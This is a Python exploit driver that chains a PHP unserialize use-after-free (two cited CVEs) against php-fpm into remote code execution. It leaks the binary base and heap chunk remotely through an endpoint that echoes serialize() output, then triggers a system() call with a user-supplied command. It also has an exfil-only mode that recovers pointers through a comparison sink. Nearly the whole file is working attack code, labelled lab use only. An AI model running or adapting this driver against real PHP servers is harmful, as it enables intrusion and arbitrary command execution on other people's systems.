#!/usr/bin/env python3
# INDEX: end-to-end uaf->rce driver | fpm | pure | serialize+unserialize | free
"""End-to-end php-fpm UAF->RCE driver over an app unserialize+echo sink.
Leaks chunk + binbase, fires, lands uid=33, fully remote, no /proc in the
exploit path. CVE-2026-109618 / CVE-2026-109619. php-fpm SAPI.

Bug credit: iQingshan var_hash unserialize UAF (CVE-2026-109618/109619).

Wires the proven pieces together: the write-free remote binbase leak (masks the heap
pointer to the 2 MB chunk base, auto-derives the element-0 object offset, reads
&zval_ptr_dtor) feeds the stock run_fpm_chain, with the 8.4.26 fire shim
installed so the unchanged driver lands uid=33:

    leak = leak_binbase(remote_rce); install_fpm_patches(...); fire_8426_shim.install(...)
    ok, _ = rce.run_fpm_chain(host, port, path, binbase, cmd, chunk=chunk)

--variant 8.5 delegates to fpm_fullchain_rce (native fire, no shim). --mode
compare routes Stage 1 (the two-pointer leak) through a comparison/branch sink
(sort rank + gate status, no echo); the fire's by-name resolution needs the
reflective (echo) read, so the compare mode is exfil-only and stops after Stage 1.
Precondition for the full chain: one endpoint that unserialize()s attacker input
and echoes serialize() of the result. Imports the project modules read-only.
Pure stdlib, safe under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
import time
from urllib.parse import urlsplit

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/

# the binbase leak's module defaults ARE the 8.4.26 build constants
# (OBJ_CHUNK_OFF / ZVAL_PTR_DTOR_OFF / STD_OBJ_HANDLERS_OFF); for 8.5.11 the
# 8.5 path delegates to fpm_fullchain_rce, which sets its own overrides. These
# are kept here only for the --variant 8.5 self-contained leak fallback.
_V85_OBJ_CHUNK_OFF = 0x5b230
_V85_ZVAL_PTR_DTOR_OFF = 0x829460
_V85_STD_OBJ_HANDLERS_OFF = 0x1bff0a0


def _load(name, filename):
    """Import a committed poc module read-only (private, isolated instance)."""
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


# Phase 1 -- write-free remote binbase + chunk via the echo sink
def leak_phase(host, port, path, variant="8.4", tries=12, verbose=True):
    """Return (binbase, chunk, detail). The binbase leak's leak_binbase masks the
    R: heap pointer to the chunk base and auto-derives the element-0 object
    offset for the live request shape (byte-exact on 8.4.26). For 8.5.11 the
    image-pointer symbol offsets differ, so this supplies the 8.5 overrides by
    attribute assignment (configuration, not modification)."""
    rleak = _load("fpm_binbase_leak", "primitives/read_leak/fpm_binbase_leak.py")
    if variant == "8.5":
        rleak.OBJ_CHUNK_OFF = _V85_OBJ_CHUNK_OFF
        rleak.ZVAL_PTR_DTOR_OFF = _V85_ZVAL_PTR_DTOR_OFF
        rleak.STD_OBJ_HANDLERS_OFF = _V85_STD_OBJ_HANDLERS_OFF
    remote_rce = rleak._load_remote_rce()
    remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path
    if verbose:
        print("=" * 64)
        print("[Phase 1] write-free REMOTE binbase leak (echo sink; no /proc, "
              "no write)")
    binbase, detail = rleak.leak_binbase(remote_rce, leak_tries=tries, verbose=verbose)
    chunk = detail.get("chunk")
    detail["leak_reqs"] = getattr(remote_rce, "req_count", None)
    return binbase, chunk, detail


# Phase 2 -- UAF -> RCE, composing the stock run_fpm_chain (+ 8.4.26 shim)
def fire_phase(host, port, path, binbase, chunk, cmd, variant="8.4",
               attempts=6, no_preflight=False, verbose=True):
    """Feed the remotely-leaked binbase+chunk into the fpm driver's
    run_fpm_chain. On 8.4.26, fire_8426_shim.install() first patches the fire's
    class-entry/spray/geometry steps onto the shared engine module so the STOCK
    driver lands. On 8.5.11 the native fire needs no shim. Returns (ok, stats)."""
    rce = _load("fpm_route", "fpm_route.py")
    if verbose:
        print("=" * 64)
        print(f"[Phase 2] a7 UAF -> RCE (run_fpm_chain{', +8.4.26 shim' if variant == '8.4' else ', native 8.5'})"
              f"  binbase=0x{binbase:x} chunk=0x{chunk:x}")
    rce.install_fpm_patches(host, port, path, binbase, enum=False)
    token = None
    if variant == "8.4":
        shim = _load("fire_8426_shim", "fire_8426_shim.py")
        token = shim.install(rce.remote_rce, binbase, verbose=verbose)
    if not no_preflight and not rce.preflight_reflect(host, port, path):
        if token is not None:
            token.restore()
        return False, {"error": "sink preflight failed (echo sink reflects "
                                 "serialize()? -- this transport carries the "
                                 "fire's resolution reads)"}
    ok, stats = rce.run_fpm_chain(host, port, path, binbase, cmd,
                                  chunk=chunk, attempts=attempts)
    if token is not None:
        token.restore()
    return ok, stats


# ECHO route -- end-to-end: leak -> fire -> uid=33 (no /proc)
def echo_route(host, port, path, cmd, variant="8.4", tries=12, attempts=6,
               no_preflight=False, verbose=True):
    """End-to-end over ONE echo sink. Returns a result dict."""
    # 8.5.11 delegates to fpm_fullchain_rce (native fire).
    if variant == "8.5":
        fc = _load("fpm_fullchain_rce", "fpm_fullchain_rce.py")
        if verbose:
            print("[echo-route] variant 8.5 -> delegating to the committed "
                  "fpm_fullchain_rce.full_chain (native fire, no shim)")
        r = fc.full_chain(host, port, path, cmd, tries=tries, attempts=attempts,
                          no_preflight=no_preflight, verbose=verbose)
        r["variant"] = "8.5"
        return r

    t0 = time.time()
    binbase, chunk, ld = leak_phase(host, port, path, variant=variant,
                                    tries=tries, verbose=verbose)
    if binbase is None:
        return {"ok": False, "stage": "leak", "variant": variant,
                "error": ld.get("error"), "detail": ld,
                "elapsed": time.time() - t0}
    if verbose:
        print(f"[Phase 1] REMOTE binbase = 0x{binbase:x} (chunk 0x{chunk:x}, "
              f"lane={ld.get('lane')}, obj_off={ld.get('obj_off'):#x}, "
              f"confirm={ld.get('confirm') or ld.get('agree')})")
    ok, stats = fire_phase(host, port, path, binbase, chunk, cmd,
                           variant=variant, attempts=attempts,
                           no_preflight=no_preflight, verbose=verbose)
    return {
        "ok": bool(ok), "stage": "fire", "variant": variant,
        "binbase": binbase, "chunk": chunk,
        "leak_lane": ld.get("lane"), "leak_obj_off": ld.get("obj_off"),
        "leak_reqs": ld.get("leak_reqs"),
        "rce_reqs": stats.get("total_reqs"),
        "rce_crashes": stats.get("total_crashes"),
        "libc_base": stats.get("libc_base"), "system": stats.get("system"),
        "error": stats.get("error"),
        "elapsed": time.time() - t0, "stats": stats,
    }


# COMPARISON route -- exfil-only: recover the 2 pointers, no echo
def compare_route(url, read_url=None, cmd=b"id>/dev/shm/p2s-erd", fire=False,
                  verbose=True):
    """Stage 1 only (two-pointer LEAK) through an ordinary comparison/branch sink
    with NO echo, via fpm_fullchain_sinkexfil (which composes
    sideeffect_exfil_apps + the binbase leak). A fire is possible only against a
    reflective read endpoint (read_url); against a pure comparison sink Stage 2
    is structure-walled. Returns the sinkexfil run()'s result via logs; here we
    return (chunk, binbase)."""
    sx = _load("fpm_fullchain_sinkexfil", "fpm_fullchain_sinkexfil.py")
    log = print if verbose else (lambda *a, **k: None)
    log("=" * 64)
    log("[compare-route] EXFIL-ONLY: recover chunk+binbase through a comparison/"
        "branch sink with NO serialize echo (WALL 1: no fire transport here)")
    chunk, binbase, detail = sx.stage1_exfil(url, log=log)
    if binbase is None:
        log("[compare-route] stage-1 did not yield a 2MB-aligned binbase "
            "(OBJ offset may need re-calibration for this shape).")
        return chunk, None, detail
    log(f"[compare-route] NO-ECHO EXFIL complete: chunk=0x{chunk:x} "
        f"binbase=0x{binbase:x} in {detail.get('reqs')} requests")
    if fire and read_url:
        log("[compare-route] firing via the supplied reflective --read-url "
            "(the fire's resolution reads need an echo transport; WALL 1)")
        ok, stats = sx.stage2_fire(read_url, binbase, chunk, cmd, log=log)
        log(f"[compare-route] fire delivered: {ok}")
    elif fire:
        log("[compare-route] --fire requested but no --read-url: a pure "
            "comparison sink cannot carry the a7 fire's by-name resolution "
            "reads (WALL 1). Exfil stands; fire needs an echo endpoint.")
    return chunk, binbase, detail


# CLI
def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default="http://127.0.0.1:8170/remote_app.php",
                    help="echo-sink URL (mode=echo) or comparison-sink base URL "
                         "(mode=compare)")
    ap.add_argument("--mode", choices=["echo", "compare"], default="echo",
                    help="echo: full leak+fire RCE over the echo sink (default). "
                         "compare: exfil-only two-pointer leak over a comparison "
                         "sink (WALL 1 -- no fire without --read-url)")
    ap.add_argument("--variant", choices=["8.4", "8.5"], default="8.4",
                    help="8.4: fire_8426_shim fire (default). 8.5: delegate to "
                         "the committed fpm_fullchain_rce (native fire)")
    ap.add_argument("--read-url", default=None,
                    help="mode=compare: OPTIONAL reflective (echo) endpoint to "
                         "carry a fire's resolution reads (WALL 1)")
    ap.add_argument("--cmd", default="id>/dev/shm/p",
                    help="command to run (<=14 bytes after the GC byte); default "
                         "writes an out-of-band marker")
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--no-preflight", action="store_true")
    ap.add_argument("--fire", action="store_true",
                    help="mode=compare: attempt the fire after exfil (needs "
                         "--read-url; demonstrates WALL 1 without it)")
    args = ap.parse_args(argv)

    if args.mode == "compare":
        print(f"[erd] COMPARE mode: {args.url}  (exfil-only; WALL 1)")
        chunk, binbase, _ = compare_route(args.url, read_url=args.read_url,
                                          cmd=args.cmd.encode("latin-1"),
                                          fire=args.fire)
        print("=" * 64)
        print(f"[erd] compare exfil: chunk={hex(chunk) if chunk else None} "
              f"binbase={hex(binbase) if binbase else None}")
        return 0 if binbase is not None else 1

    u = urlsplit(args.url if "://" in args.url else "http://" + args.url)
    host, port = u.hostname, u.port or 80
    path = u.path if u.path and u.path.endswith(".php") else "/remote_app.php"
    print(f"[erd] ECHO route: http://{host}:{port}{path}  variant={args.variant}")
    print("[erd] NO /proc / NO local seed: binbase is leaked remotely")
    r = echo_route(host, port, path, args.cmd, variant=args.variant,
                   tries=args.tries, attempts=args.attempts,
                   no_preflight=args.no_preflight)
    print("=" * 64)
    if not r["ok"] and r.get("stage") == "leak":
        print(f"[erd] FAILED at leak: {r.get('error')}")
        return 2
    if not r["ok"]:
        print(f"[erd] FAILED at fire: {r.get('error')}")
    print(f"[erd] fire delivered: {r['ok']}")
    if r.get("binbase"):
        print(f"[erd] binbase=0x{r['binbase']:x} chunk=0x{r['chunk']:x} "
              f"(leaked 100% remotely)")
        print(f"[erd] requests: leak~{r.get('leak_reqs')} + rce={r.get('rce_reqs')}"
              f" | crashes={r.get('rce_crashes')} | elapsed={r['elapsed']:.1f}s")
    print("[erd] verify out-of-band: the --cmd marker (the a7 fire SIGSEGVs "
          "after system() returns; check the marker, not the HTTP response).")
    return 0 if r["ok"] else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
